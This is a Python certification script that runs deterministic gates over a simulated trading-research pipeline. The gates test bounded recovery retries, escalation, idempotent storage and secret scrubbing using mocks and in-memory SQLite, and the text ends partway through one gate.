"""Run 61 — HSF Autonomous Research Mode v1 certification (deterministic gates A–X).

Certifies the combined Runs 54–60 operating system without changing it. Every
gate is a pure function returning {status, evidence, reference, mandatory,
notes}. Destructive and failure scenarios use fixtures, mocks and an in-memory
SQLite store; nothing here touches production or simulates market returns.

Verdict: AUTONOMOUS_RESEARCH_MODE_V1_CERTIFIED iff every mandatory gate PASSes,
else NOT_CERTIFIED. There is no other value.
"""
from __future__ import annotations

import copy
import datetime as _dt
import json
import re
import sqlite3
from pathlib import Path
from typing import Any, Callable, Dict, List, Mapping, Optional, Tuple
from unittest import mock

from analytics import forward_readiness as fr
from analytics import market_calendar as mc
from analytics import recovery_controller as rc
from analytics import recovery_policy as rp
from analytics import system_health as sh

SCHEMA = "hsf-autonomy-certification-1.0"
RELEASE = "HSF Autonomous Research Mode v1"
CERTIFIED = "AUTONOMOUS_RESEARCH_MODE_V1_CERTIFIED"
NOT_CERTIFIED = "NOT_CERTIFIED"
ROOT = Path(__file__).resolve().parents[1]
UTC = _dt.timezone.utc
RECOVER = {"HSF_AUTONOMY_ENABLED": "true", "HSF_AUTONOMY_MODE": "recover"}
EXPECTED_EPOCH = {
    "forward_epoch_start_timestamp": "2026-09-26T07:23:11+00:00",
    "run55_evaluation_commit": "284e2ac8ec8640d73679c55555772eeda2505485",
    "run55_criteria_commit": "c5d34a751d00b9245a43d34e98694ce1e94de1dc",
}
GOLDEN = ROOT / "tests" / "fixtures" / "frozen_scanner_golden.json"


def _gate(status: str, evidence: Any, reference: str, notes: str = "", mandatory: bool = True) -> Dict[str, Any]:
    return {"status": status, "evidence": evidence, "reference": reference, "mandatory": mandatory, "notes": notes}


def _check(conds: Mapping[str, bool]) -> str:
    return "PASS" if all(conds.values()) else "FAIL"


# ---- synthetic operational world (no market returns) -----------------------------------------
def _run(t: _dt.datetime, conclusion: str = "success", event: str = "schedule", minutes: int = 3) -> Dict[str, Any]:
    return {"created_at": t.isoformat(), "updated_at": (t + _dt.timedelta(minutes=minutes)).isoformat(),
            "conclusion": conclusion, "status": "completed", "event": event}


def _readiness(now: _dt.datetime, days: int) -> Dict[str, Any]:
    par = {h: {"candidate_maturation_pct": None, "near_miss_maturation_pct": None, "control_maturation_pct": None,
               "maturation_parity_gap": None, "measurable": False, "parity_classification": "NOT_MEASURABLE"}
           for h in ("+5m", "+15m", "+30m", "+60m")}
    return {"generated_at": now.isoformat(), "state": "COLLECTING",
            "limiting_factor": "NO_FORWARD_DATA" if days == 0 else "NOT_ENOUGH_TIME", "state_reason": "sim",
            "epoch": {"forward_epoch_start_timestamp": fr.FORWARD_EPOCH["forward_epoch_start_timestamp"]},
            "time_coverage": {"completed_forward_trading_days": days},
            "scan_coverage": {"regular_session_scan_runs": 3 * days, "forward_observations_regular_session": 250 * days},
            "gates": {g: {"status": "FAIL"} for g in sh._READINESS_WHITELIST_GATES},
            "horizons": {}, "maturation_parity": par, "estimated_trading_days_until_ready": "UNKNOWN"}


class World:
    """Deterministic operational world: schedules, workflow runs, telemetry."""

    def __init__(self, start: _dt.datetime):
        self.t = start
        self.scan_runs: List[Dict[str, Any]] = []
        self.mat_runs: List[Dict[str, Any]] = []
        self.readiness_runs: List[Dict[str, Any]] = []
        self.health_runs: List[Dict[str, Any]] = []
        self.refresh_runs: List[Dict[str, Any]] = [_run(start - _dt.timedelta(days=3))]
        self.parity_at = start - _dt.timedelta(days=1)
        self.report = self._report(start - _dt.timedelta(hours=2))
        self.db_ok = True
        self.maturation_broken = False
        self.skip_scan_days: set = set()
        self.skip_readiness_days: set = set()
        self.fail_maturation_days: set = set()
        self.rate_limit_days: set = set()
        self.transient_429_days: set = set()
        self.obs_ids: List[str] = []
        self.prev: Optional[Dict[str, Any]] = None
        self.trading_days_seen = 0
        self.actions_executed: List[Tuple[str, str]] = []

    @staticmethod
    def _report(t, *, deferred=0, rate_limited=0, n429=0, schema="hsf-maturation-1.2"):
        return {"schema": schema, "generated_at": t.isoformat(), "dry_run": False, "alpaca_requests": 20,
                "alpaca_429_count": n429, "alpaca_retry_count": n429, "rate_limited_symbols": rate_limited,
                "provider_error_symbols": 0, "price_data_unavailable_symbols": 50, "symbols_processed": 1500,
                "symbols_deferred": deferred, "outcomes_matured": 1000,
                "backlog": {"ready_symbols": 1500 + deferred, "deferred_symbols": deferred, "max_symbols": 2000},
                "retired": {"observations": 5}}

    def advance(self, until: _dt.datetime) -> None:
        """Materialize every scheduled event in (self.t, until]."""
        d = self.t.astimezone(mc.ET).date()
        while d <= until.astimezone(mc.ET).date():
            trading = mc.is_trading_day(d)
            for s in mc.expected_scan_slots(d):
                if self.t < s <= until and d not in self.skip_scan_days:
                    self.scan_runs.append(_run(s + _dt.timedelta(seconds=10), event="workflow_dispatch"))
                    if mc.is_market_open(s + _dt.timedelta(minutes=2)):
                        hb = s.replace(minute=0).isoformat()
                        self.obs_ids += [f"{c}{i}|{hb}" for c in ("CA", "NM", "CT") for i in range(3)]
            def at(h, m):
                return _dt.datetime(d.year, d.month, d.day, h, m, tzinfo=UTC)
            if trading and self.t < at(22, 30) <= until:
                failed = self.maturation_broken or d in self.fail_maturation_days
                self.mat_runs.append(_run(at(22, 30), "failure" if failed else "success"))
                if not failed:
                    self.report = self._report(at(22, 30), rate_limited=200 if d in self.rate_limit_days else 0,
                                               n429=40 if d in self.rate_limit_days else
                                               (3 if d in self.transient_429_days else 0))
                self.trading_days_seen += 1
            if trading and self.t < at(23, 15) <= until and d not in self.skip_readiness_days:
                self.readiness_runs.append(_run(at(23, 15), event="schedule"))
            for hh, mm in ((17, 5), (23, 45)):
                if trading and self.t < at(hh, mm) <= until:
                    self.health_runs.append(_run(at(hh, mm)))
            if d.weekday() == 6 and self.t < at(10, 30) <= until:
                self.refresh_runs.append(_run(at(10, 30)))
            d += _dt.timedelta(days=1)
        self.t = until

    def inputs(self, now: _dt.datetime) -> Dict[str, Any]:
        self.advance(now)
        win = now - _dt.timedelta(days=3)
        per_scan = []
        for r in self.scan_runs:
            c = _dt.datetime.fromisoformat(r["created_at"])
            if c >= win and r["conclusion"] == "success" and mc.is_market_open(c + _dt.timedelta(minutes=2)):
                per_scan.append({"scan_time": (c + _dt.timedelta(minutes=1)).isoformat(), "n": 250,
                                 "by_cohort": {"CANDIDATE": 100, "NEAR_MISS": 50, "CONTROL": 100}})
        tail = (lambda xs: xs[-60:])
        last_ready = max((r["created_at"] for r in self.readiness_runs if r["conclusion"] == "success"), default=None)
        return {
            "now": now.isoformat(),
            "universe": {"symbol_count": 11500, "source": "live", "generated_at": now.isoformat(),
                         "exclusions": {}, "provider_assets": 12500, "duplicates": 0, "malformed": 0},
            "previous": self.prev,
            "scan_runs": tail(self.scan_runs), "db_runs": [],
            "observations_summary": {"observations": 250 * len(per_scan), "by_cohort": {}, "untagged": 0,
                                     "duplicate_ids": len(self.obs_ids) - len(set(self.obs_ids)), "malformed": 0,
                                     "metadata_scope_n": 250 * len(per_scan),
                                     "metadata_block_pct": 100.0 if per_scan else None,
                                     "per_scan": per_scan, "latest_created_at": now.isoformat()},
            "maturation_report": self.report,
            "maturation_runs": tail(self.mat_runs),
            "db_probe": ({"connected": True, "latency_ms": 100, "observations_accessible": True,
                          "outcomes_accessible": True, "duplicate_outcome_keys": 0,
                          "latest_observation_created_at": now.isoformat(), "null_rates_pct": {}}
                         if self.db_ok else {"connected": False, "error": "simulated outage"}),
            "workflows": {"scheduled-scans.yml": tail(self.scan_runs), "mature-observations.yml": tail(self.mat_runs),
                          "refresh-universe.yml": tail(self.refresh_runs),
                          "forward-evidence-readiness.yml": tail(self.readiness_runs),
                          "maturation-parity-audit.yml": [_run(self.parity_at, event="workflow_dispatch")],
                          "system-health.yml": tail(self.health_runs)},
            "readiness": _readiness(now, min(self.trading_days_seen, 20)),
            "parity": {"generated_at": self.parity_at.isoformat(), "current_historical": {"parity": {}},
                       "root_cause": {"classification": "MARKET_DATA_AVAILABILITY_EFFECT", "confidence": "HIGH"}},
            "artifacts": {"forward_evidence_readiness": {"generated_at": last_ready},
                          "maturation_parity_audit": {"generated_at": self.parity_at.isoformat()},
                          "latest_scanner_observation": {"generated_at": now.isoformat()},
                          "previous_system_health": {"generated_at": (self.prev or {}).get("generated_at")}},
            "recovery": {"implemented": True, "ledger_available": True, "circuit_open": False,
                         "production_state": "RECOVERY_ENABLED", "reason": "certification fixture"},
        }

    def health(self, now: _dt.datetime) -> Dict[str, Any]:
        rep = sh.evaluate(self.inputs(now))
        self.prev = {"generated_at": rep["generated_at"], "subsystems": {
            k: {"metrics": v.get("metrics")} for k, v in rep["subsystems"].items()}}
        return rep

    def execute(self, now_fn: Callable[[], _dt.datetime]):
        def _exec(action: str, spec: Mapping[str, Any]) -> Dict[str, Any]:
            now = now_fn()
            self.actions_executed.append((action, now.isoformat()))
            if action in ("RETRY_MATURATION", "RETRY_TRANSIENT_PROVIDER_OPERATION"):
                ok = not self.maturation_broken
                self.mat_runs.append(_run(now, "success" if ok else "failure", event="workflow_dispatch"))
                if ok:
                    self.report = self._report(now)
                return {"ok": ok, "error": None if ok else "simulated persistent maturation failure"}
            if action == "REGENERATE_FORWARD_READINESS":
                self.readiness_runs.append(_run(now, event="workflow_dispatch"))
            elif action == "RERUN_PARITY_AUDIT":
                self.parity_at = now
            elif action == "RETRY_UNIVERSE_REFRESH":
                self.refresh_runs.append(_run(now, event="workflow_dispatch"))
            elif action == "RETRY_SAFE_SCANNER_RUN":
                raise AssertionError("scanner reruns must never execute")
            return {"ok": True}
        return _exec


def health_inputs(now: _dt.datetime, days_back: int = 8) -> Dict[str, Any]:
    """Healthy steady-state inputs at `now` (world run for `days_back` days)."""
    w = World(now - _dt.timedelta(days=days_back))
    w.parity_at = now - _dt.timedelta(days=1)   # steady state: weekly parity audit is current
    w.advance(now - _dt.timedelta(minutes=1))
    w.health(now - _dt.timedelta(minutes=1))
    return w.inputs(now)


def cycle(health: Mapping[str, Any], ledger: List[Dict[str, Any]], env: Mapping[str, str], now: _dt.datetime,
          execute_fn, verify_fn) -> Dict[str, Any]:
    return rc.run_cycle(health, ledger, env, execute_fn=execute_fn, verify_fn=verify_fn,
                        append_fn=ledger.append, now=now, clock=lambda: now)


# ---- Gates ---------------------------------------------------------------------------------
def _load_workflow(path: Path) -> Tuple[Dict[str, Any], str]:
    text = path.read_text()
    try:
        import yaml
        doc = yaml.safe_load(text) or {}
        on = doc.get("on", doc.get(True, {}))  # YAML 1.1 parses bare `on` as True
        return {"on": on or {}, "jobs": doc.get("jobs") or {}, "parser": "yaml"}, text
    except ImportError:
        crons = re.findall(r'cron:\s*"([^"]+)"|cron:\s*\'([^\']+)\'', text)
        on = {"schedule": [{"cron": a or b} for a, b in crons]}
        if "workflow_dispatch" in text:
            on["workflow_dispatch"] = {}
        return {"on": on, "jobs": {"_": {}} if "jobs:" in text else {}, "parser": "regex"}, text


def gate_a_scheduled_operation() -> Dict[str, Any]:
    wf_dir = ROOT / ".github" / "workflows"
    required = {"refresh-universe.yml", "scheduled-scans.yml", "mature-observations.yml",
                "forward-evidence-readiness.yml", "system-health.yml", "autonomous-recovery.yml"}
    ev, conds = {}, {}
    per_week = 0
    for name in sorted(required | {"autonomy-certification.yml"}):
        p = wf_dir / name
        if not p.exists():
            conds[f"{name} exists"] = name not in required
            continue
        doc, text = _load_workflow(p)
        on = doc["on"] if isinstance(doc["on"], dict) else {k: {} for k in (doc["on"] or [])}
        crons = [s.get("cron") for s in (on.get("schedule") or [])]
        ev[name] = {"parser": doc["parser"], "schedules": crons, "workflow_dispatch": "workflow_dispatch" in on,
                    "workflow_run": "workflow_run" in on, "jobs": len(doc["jobs"])}
        conds[f"{name} parses with jobs"] = bool(doc["jobs"])
        conds[f"{name} has no workflow_run chain"] = "workflow_run" not in on
        if name in ("system-health.yml", "autonomous-recovery.yml"):
            for c in crons:
                parts = c.split()
                dow = parts[4]
                days = 5 if dow in ("1-5", "2-6") else 7 if dow == "*" else len(dow.split(","))
                hours = len(parts[1].split(",")) if parts[1] != "*" else 24
                per_week += days * hours
        if name == "autonomy-certification.yml":
            conds["certification is dispatch-only"] = not crons and "workflow_dispatch" in on
            conds["certification never enables recovery"] = "HSF_AUTONOMY_MODE: recover" not in text \
                and "variable set" not in text
    conds["recovery never dispatches itself"] = "autonomous-recovery.yml" not in rp.KNOWN_WORKFLOWS
    other_refs = [p.name for p in wf_dir.glob("*.yml") if p.name != "autonomous-recovery.yml"
                  and "autonomous-recovery" in p.read_text()]
    conds["no other workflow triggers recovery"] = not other_refs
    conds["health+recovery ≤ 30 scheduled runs/week"] = per_week <= 30
    return _gate(_check(conds), {"workflows": ev, "health_recovery_runs_per_week": per_week, "checks": conds},
                 ".github/workflows/*.yml; recovery_policy.KNOWN_WORKFLOWS")


def gate_b_calendar() -> Dict[str, Any]:
    conds = {
        "weekday is trading day": mc.is_trading_day(_dt.date(2026, 11, 24)),
        "Saturday not trading": not mc.is_trading_day(_dt.date(2026, 11, 28)),
        "Christmas not trading": not mc.is_trading_day(_dt.date(2026, 12, 25)),
        "Thanksgiving not trading": not mc.is_trading_day(_dt.date(2026, 11, 26)),
        "early close 13:00 ET": mc.close_time_et(_dt.date(2026, 11, 27)) == _dt.time(13, 0),
    }
    cases = {}
    for label, now in (("saturday", _dt.datetime(2026, 11, 28, 18, 0, tzinfo=UTC)),
                       ("christmas", _dt.datetime(2026, 12, 25, 20, 0, tzinfo=UTC)),
                       ("early_close_evening", _dt.datetime(2026, 11, 27, 23, 50, tzinfo=UTC))):
        rep = sh.evaluate(health_inputs(now))
        plan = rp.build_plan(rep, [], RECOVER, now=now)
        bad = [i["incident_id"] for i in rep["incidents"]]
        cases[label] = {"incidents": bad, "would_execute": plan["would_execute"]}
        conds[f"{label}: no incidents"] = not bad
        conds[f"{label}: no recovery"] = not plan["would_execute"]
    ec_open = mc.is_market_open(_dt.datetime(2026, 11, 27, 19, 35, tzinfo=UTC))   # 14:35 ET after early close
    conds["early close: 14:35 ET not a regular session"] = not ec_open
    return _gate(_check(conds), {"checks": conds, "cases": cases}, "analytics/market_calendar.py")


def gate_c_point_in_time() -> Dict[str, Any]:
    # EDT date: the 13:35 UTC dispatch is the 09:35 ET scan; detected at 15:00 ET.
    now = _dt.datetime(2026, 10, 6, 19, 0, tzinfo=UTC)
    inp = health_inputs(now)
    inp["scan_runs"] = [r for r in inp["scan_runs"] if not r["created_at"].startswith("2026-10-06T13:35")]
    inp["workflows"]["scheduled-scans.yml"] = inp["scan_runs"]
    rep = sh.evaluate(inp)
    calls: List[str] = []
    ledger: List[Dict[str, Any]] = []
    out = cycle(rep, ledger, RECOVER, now, lambda a, s: calls.append(a) or {"ok": True}, lambda: rep)
    d = next((x for x in out["plan"]["decisions"] if x["incident_type"] == "MISSED_SCAN"), None)
    conds = {"missed scan detected": d is not None,
             "policy ESCALATE": bool(d) and d["policy"] == "ESCALATE",
             "no scanner rerun executed": "RETRY_SAFE_SCANNER_RUN" not in calls,
             "window condition false (15:00 vs 09:35)": bool(d) and not d["scanner_guard"]["conditions"]["within_market_time_window"],
             "idempotency not claimed": not rp.ALLOWLIST["RETRY_SAFE_SCANNER_RUN"]["idempotency_proven"]}
    return _gate(_check(conds), {"checks": conds, "decision": d and {k: d[k] for k in ("policy", "reason")}},
                 "recovery_policy.scanner_guard; ALLOWLIST.RETRY_SAFE_SCANNER_RUN")


def gate_d_capture_idempotency() -> Dict[str, Any]:
    from analytics import research_metadata as rm
    from analytics.observation_capture import build_scan_observations
    from analytics.research_cohorts import build_control_observations, build_near_miss_observations
    from db import hsf_observations as store
    ts = "2026-11-24T14:35:30+00:00"
    rows = [{"Ticker": f"T{i}", "BreakoutScore": 50 - i, "Last": 10.0, "Volume": 1e6} for i in range(5)]
    nm_rows = [{"Ticker": f"N{i}", "BreakoutScore": 20 - i, "Last": 10.0, "Volume": 1e6} for i in range(3)]
    snap = {f"C{i}": {"price": 5.0, "volume": 1e5, "source": "alpaca_multi"} for i in range(4)}
    ctx = rm.build_run_context(universe="US_MARKET", session="regular", scan_id=ts, scan_config={"top_n": 5})

    def build():
        c = build_scan_observations(rows, universe="US_MARKET", scan_timestamp=ts, scan_id=ts,
                                    research_cohort="CANDIDATE", selection_reason="top_n_candidate")
        rm.attach(c, ctx, rows=rows)
        n = build_near_miss_observations(nm_rows, universe="US_MARKET", scan_timestamp=ts, scan_id=ts,
                                         research_run_context=ctx, top_n=5)
        k = build_control_observations(sorted(snap), snap, universe="US_MARKET", scan_timestamp=ts, scan_id=ts,
                                       research_run_context=ctx)
        return c + n + k
    a, b = build(), build()
    conn = sqlite3.connect(":memory:")
    conn.row_factory = sqlite3.Row
    try:
        r1 = store.save_observations_batch(a, conn=conn)
        r2 = store.save_observations_batch(b, conn=conn)
        later = [dict(o, observation_id=o["observation_id"]) for o in b]   # same-hour retry of the scan
        r3 = store.save_observations_batch(later, conn=conn)
        n = conn.execute("SELECT COUNT(*) FROM hsf_observations").fetchone()[0]
    finally:
        conn.close()
    conds = {"stable ids across executions": [o["observation_id"] for o in a] == [o["observation_id"] for o in b],
             "first save wrote all": r1.get("written") == len(a),
             "second save wrote none": r2.get("written", 0) == 0,
             "retry wrote none": r3.get("written", 0) == 0,
             "row count unchanged": n == len(a),
             "recovery never reruns the scanner": "RETRY_SAFE_SCANNER_RUN" not in _auto_actions_ever()}
    return _gate(_check(conds), {"checks": conds, "saves": [r1, r2, r3], "rows": n},
                 "hsf_observation.make_observation_id (hour bucket); save_observations_batch ON CONFLICT DO NOTHING")


def _auto_actions_ever() -> set:
    """Actions that can actually reach AUTO_RECOVER (scanner guard always escalates)."""
    return {a for a, s in rp.ALLOWLIST.items() if not (a == "RETRY_SAFE_SCANNER_RUN" and not s["idempotency_proven"])}


def gate_e_maturation_idempotency() -> Dict[str, Any]:
    from analytics.observation_capture import build_scan_observations
    from db import hsf_observations as store
    from scripts import mature_observations as worker
    ts = "2026-11-24T14:35:30+00:00"
    obs = build_scan_observations([{"Ticker": f"T{i}", "BreakoutScore": 30.0, "Last": 10.0} for i in range(4)],
                                  universe="US_MARKET", scan_timestamp=ts, research_cohort="CANDIDATE")
    t0 = _dt.datetime.fromisoformat(ts)
    bars = [{"t": (t0 + _dt.timedelta(minutes=i)).isoformat(), "c": 10 + 0.01 * i} for i in range(120)]
    now = _dt.datetime(2026, 11, 24, 23, 0, tzinfo=UTC)
    conn = sqlite3.connect(":memory:")
    conn.row_factory = sqlite3.Row
    reports, snaps = [], []
    try:
        for o in obs:
            store.save_observation(o, conn=conn)
        for _ in range(3):
            loaded = store.load_recent_observations(limit=100, attach_outcomes=True, conn=conn)
            rep = worker.mature_observations(loaded, now=now, exclusion_reason=lambda s: None,
                                             fetch_bars_batch=lambda s, a, b: {k: bars for k in s},
                                             save_fn=lambda oc: store.save_outcome(oc, conn=conn))
            reports.append(rep["outcomes_matured"])
            snaps.append(sorted(json.dumps(r[0], sort_keys=True) for r in
                                conn.execute("SELECT record FROM hsf_observation_outcomes").fetchall()))
        dup = conn.execute("SELECT COUNT(*) FROM (SELECT observation_id, horizon FROM hsf_observation_outcomes "
                           "GROUP BY observation_id, horizon HAVING COUNT(*) > 1)").fetchone()[0]
        late = now + _dt.timedelta(days=7)
        loaded = store.load_recent_observations(limit=100, attach_outcomes=True, conn=conn)
        r_a = worker.mature_observations(loaded, now=late, dry_run=True, fetch_bars_batch=lambda s, a, b: {},
                                         exclusion_reason=lambda s: None)["retired"]
        r_b = worker.mature_observations(loaded, now=late, dry_run=True, fetch_bars_batch=lambda s, a, b: {},
                                         exclusion_reason=lambda s: None)["retired"]
    finally:
        conn.close()
    conds = {"first run matured": reports[0] == 16, "reruns write nothing": reports[1:] == [0, 0],
             "values unchanged across reruns": snaps[0] == snaps[1] == snaps[2],
             "no duplicate keys": dup == 0, "retirement deterministic": r_a == r_b}
    return _gate(_check(conds), {"checks": conds, "matured_per_run": reports},
                 "scripts/mature_observations.py; db.hsf_observations.save_outcome (first-write-wins)")


def gate_f_provider_failures() -> Dict[str, Any]:
    from data import price_alpaca as pa

    def resp(status, payload=None, headers=None):
        r = mock.MagicMock()
        r.status_code, r.headers = status, headers or {}
        r.json.return_value = payload if payload is not None else {}
        r.raise_for_status.side_effect = RuntimeError(f"HTTP {status}") if status >= 400 else None
        return r

    def run(responses, **kw):
        fake = mock.MagicMock()
        fake.get.side_effect = list(responses)
        stats = pa.AlpacaRequestStats()
        with mock.patch.object(pa, "requests", fake), \
                mock.patch.object(pa, "get_alpaca_config", return_value={"data_url": "x", "api_key": "k", "api_secret": "s"}), \
                mock.patch.object(pa, "get_alpaca_data_feed", return_value="iex"):
            try:
                return pa.fetch_minute_bars_multi(["AAA"], "S", "E", stats=stats, sleep=lambda s: None, **kw), stats
            except Exception as e:
                return e, stats
    import requests as _rq
    ok_page = {"bars": {"AAA": [{"t": "T", "c": 1}]}, "next_page_token": None}
    r429, s429 = run([resp(429, headers={"Retry-After": "1"}), resp(200, ok_page)])
    r5xx, s5xx = run([resp(500), resp(503), resp(200, ok_page)])
    rto, sto = run([_rq.exceptions.Timeout("t"), resp(200, ok_page)])
    rempty, _ = run([resp(200, {"bars": {}, "next_page_token": None})])
    rpers, spers = run([resp(429)] * 6)
    # recovery layer: persistent provider failure is bounded then escalated
    now = _dt.datetime(2026, 11, 24, 23, 50, tzinfo=UTC)
    inp = health_inputs(now)
    inp["maturation_report"].update(rate_limited_symbols=300, alpaca_429_count=60)
    h = sh.evaluate(inp)
    ledger: List[Dict[str, Any]] = []
    calls: List[str] = []
    for k in range(4):
        t = now + _dt.timedelta(hours=k * 2)
        cycle(h, ledger, RECOVER, t, lambda a, s: calls.append(a) or {"ok": False, "error": "still 429"}, lambda: h)
    prov_calls = [c for c in calls if c == "RETRY_TRANSIENT_PROVIDER_OPERATION"]
    # secret scrubbing
    from scripts import autonomous_recovery as ar
    with mock.patch.dict("os.environ", {"GH_TOKEN": "ghs_SECRET123", "ALPACA_API_SECRET_KEY": "alpacaSECRET"}):
        scrubbed = ar._scrub("dispatch failed token=ghs_SECRET123 key=alpacaSECRET")
    conds = {"429 retried then ok": isinstance(r429, dict) and s429.rate_limited == 1 and s429.retries == 1,
             "5xx retried then ok": isinstance(r5xx, dict) and s5xx.retries == 2,
             "timeout retried then ok": isinstance(rto, dict) and sto.retries == 1,
             "empty response is missing data (not an error)": rempty == {},
             "persistent 429 raises bounded RateLimit error": isinstance(rpers, pa.AlpacaRateLimitError)
             and spers.requests == 6,
             "recovery retries at most 2x": len(prov_calls) <= 2,
             "then escalates": any(e.get("result") == "ESCALATED" for e in ledger),
             "one execution per action per cycle": len(calls) <= 4,
             "secrets scrubbed": "SECRET" not in scrubbed}
    return _gate(_check(conds), {"checks": conds, "recovery_calls": calls}, "data/price_alpaca._alpaca_get; recovery_policy")


def gate_g_backlog_recovery() -> Dict[str, Any]:
    now = _dt.datetime(2026, 11, 25, 17, 25, tzinfo=UTC)
    w = World(now - _dt.timedelta(days=8))
    w.fail_maturation_days = {_dt.date(2026, 11, 23), _dt.date(2026, 11, 24)}
    h = w.health(now)
    codes = {i["incident_id"] for i in h["incidents"]}
    ledger: List[Dict[str, Any]] = []
    out = cycle(h, ledger, RECOVER, now, w.execute(lambda: now), lambda: w.health(now))
    ok = next((e for e in ledger if e.get("action") == "RETRY_MATURATION"), {})
    # case 2: exit 0 but unhealthy
    w2 = World(now - _dt.timedelta(days=8))
    w2.fail_maturation_days = {_dt.date(2026, 11, 23), _dt.date(2026, 11, 24)}
    h2 = w2.health(now)
    led2: List[Dict[str, Any]] = []
    calls = []
    for k in range(3):
        t = now + _dt.timedelta(hours=k)
        cycle(h2, led2, RECOVER, t, lambda a, s: calls.append(a) or {"ok": True}, lambda: h2)
    res2 = [e["result"] for e in led2 if e.get("action") == "RETRY_MATURATION"]
    conds = {"health detected stale maturation": "maturation:MATURATION_STALE" in codes,
             "policy selected RETRY_MATURATION": any(d["action"] == "RETRY_MATURATION" and d["policy"] == "AUTO_RECOVER"
                                                     for d in out["plan"]["decisions"]),
             "retry verified CLEARED": ok.get("result") == "SUCCESS" and ok.get("verification_result") == "CLEARED",
             "exit 0 but unhealthy → VERIFICATION_FAILED": "VERIFICATION_FAILED" in res2 and "SUCCESS" not in res2,
             "escalated after limit (or circuit)": "ESCALATED" in res2 or any(e["result"] == "CIRCUIT_OPENED" for e in led2),
             "never more than 2 executions": calls.count("RETRY_MATURATION") <= 2}
    return _gate(_check(conds), {"checks": conds, "case2_results": res2}, "recovery_controller.verify (maturation)")


def gate_h_universe() -> Dict[str, Any]:
    from data import us_market_universe as um
    now = _dt.datetime(2026, 11, 29, 17, 25, tzinfo=UTC)   # Sunday: refresh expected
    inp = health_inputs(_dt.datetime(2026, 11, 30, 17, 25, tzinfo=UTC))
    inp["workflows"]["refresh-universe.yml"] = [_run(_dt.datetime(2026, 11, 15, 10, 30, tzinfo=UTC))]
    h = sh.evaluate(inp)
    plan = rp.build_plan(h, [], RECOVER, now=_dt.datetime(2026, 11, 30, 17, 25, tzinfo=UTC))
    d = next((x for x in plan["decisions"] if x["incident_type"] == "WORKFLOW_STALE"), {})
    bad = copy.deepcopy(inp)
    bad["universe"].update(symbol_count=40, source="live")
    after_bad = sh.evaluate(bad)
    ver = rc.verify({"incident_id": d.get("incident_id"), "action": "RETRY_UNIVERSE_REFRESH",
                     "incident_type": "WORKFLOW_STALE"}, h, after_bad)
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        cache = Path(tmp) / "us_market.json"
        good = [{"symbol": f"S{i:04d}", "status": "active", "tradable": True, "class": "us_equity",
                 "exchange": "NASDAQ"} for i in range(1500)]
        with mock.patch.object(um, "CACHE_PATH", cache):
            first = um.build_us_market_universe(fetch=lambda: good)
            tiny = um.build_us_market_universe(fetch=lambda: good[:10])
            kept = json.loads(cache.read_text())["symbols"]
    conds = {"stale refresh → bounded RETRY_UNIVERSE_REFRESH": d.get("policy") == "AUTO_RECOVER"
             and d.get("action") == "RETRY_UNIVERSE_REFRESH" and d.get("attempt_limit") == 2,
             "tiny universe after retry NOT accepted": ver["result"] == "NOT_CLEARED",
             "tiny universe flagged BROKEN": after_bad["subsystems"]["universe"]["detail_state"] == "BROKEN",
             "implausible fetch falls back to last-known-good": tiny["source"] == "cached" and tiny["symbol_count"] == 1500,
             "last-known-good cache not overwritten": len(kept) == 1500 and first["source"] == "live",
             "UNIVERSE_SIZE_JUMP escalates": rp.build_plan(after_bad, [], RECOVER, now=now)["decisions"]
             and all(x["policy"] == "ESCALATE" for x in rp.build_plan(after_bad, [], RECOVER, now=now)["decisions"]
                     if x["incident_type"] == "UNIVERSE_SIZE_JUMP")}
    return _gate(_check(conds), {"checks": conds}, "data/us_market_universe.build_us_market_universe; verify()")


def gate_i_database() -> Dict[str, Any]:
    now = _dt.datetime(2026, 11, 24, 23, 50, tzinfo=UTC)
    cases = {}
    for label, probe in (("unavailable", {"connected": False, "error": "x"}), ("query_failure",
                         {"connected": True, "latency_ms": 90, "observations_accessible": False,
                          "outcomes_accessible": True}), ("no_probe", None)):
        inp = health_inputs(now)
        inp["db_probe"] = probe
        h = sh.evaluate(inp)
        ledger: List[Dict[str, Any]] = []
        calls: List[str] = []
        out = cycle(h, ledger, RECOVER, now, lambda a, s: calls.append(a) or {"ok": True}, lambda: h)
        cases[label] = {"db_status": h["subsystems"]["database"]["status"],
                        "scanner_status": h["subsystems"]["scanner"]["status"],
                        "circuit_open": out["plan"]["circuit_breaker"]["open"], "executed": calls}
    conds = {"unavailable not HEALTHY": cases["unavailable"]["db_status"] == "ACTION_REQUIRED",
             "query failure not HEALTHY": cases["query_failure"]["db_status"] == "ACTION_REQUIRED",
             "no probe → UNKNOWN": cases["no_probe"]["db_status"] == "UNKNOWN",
             "other subsystems still render": all(c["scanner_status"] == "HEALTHY" for c in cases.values()),
             "integrity uncertain opens circuit": all(c["circuit_open"] for c in cases.values()),
             "no execution (no repair)": all(not c["executed"] for c in cases.values()),
             "no repair actions exist": not {"RESTORE_DATABASE", "DELETE_DATA"} & set(rp.ALLOWLIST)}
    return _gate(_check(conds), {"checks": conds, "cases": cases}, "system_health.eval_database; recovery circuit")


def gate_j_isolation() -> Dict[str, Any]:
    now = _dt.datetime(2026, 11, 24, 23, 50, tzinfo=UTC)
    base = health_inputs(now)
    breaks = {"github_metadata": ("workflows", "scan_runs", "maturation_runs"),
              "alpaca_universe": ("universe",), "run58_artifact": ("parity",),
              "run56_readiness": ("readiness",), "maturation_report": ("maturation_report",)}
    expect_unknown = {"github_metadata": {"workflows", "scanner"}, "alpaca_universe": {"universe"},
                      "run56_readiness": {"forward_evidence"}, "run58_artifact": set(), "maturation_report": set()}
    res, conds = {}, {}
    for label, keys in breaks.items():
        inp = copy.deepcopy(base)
        for k in keys:
            inp[k] = None
        if label == "run58_artifact":
            inp["artifacts"]["maturation_parity_audit"]["generated_at"] = None
        h = sh.evaluate(inp)
        st = {n: s["status"] for n, s in h["subsystems"].items()}
        res[label] = st
        conds[f"{label}: affected subsystems UNKNOWN"] = all(st[n] == "UNKNOWN" for n in expect_unknown[label])
        conds[f"{label}: database still reported"] = st["database"] == "HEALTHY"
        conds[f"{label}: no fabricated HEALTHY system"] = h["system_status"] != "HEALTHY" or not expect_unknown[label]
    inp = copy.deepcopy(base)
    inp["parity"] = None
    inp["artifacts"]["maturation_parity_audit"]["generated_at"] = None
    conds["missing Run 58 artifact → artifact freshness UNKNOWN"] = \
        sh.evaluate(inp)["subsystems"]["artifact_freshness"]["status"] == "UNKNOWN"
    inp = copy.deepcopy(base)
    inp["maturation_report"] = None
    mr = sh.evaluate(inp)
    conds["missing maturation report surfaces an incident"] = any(
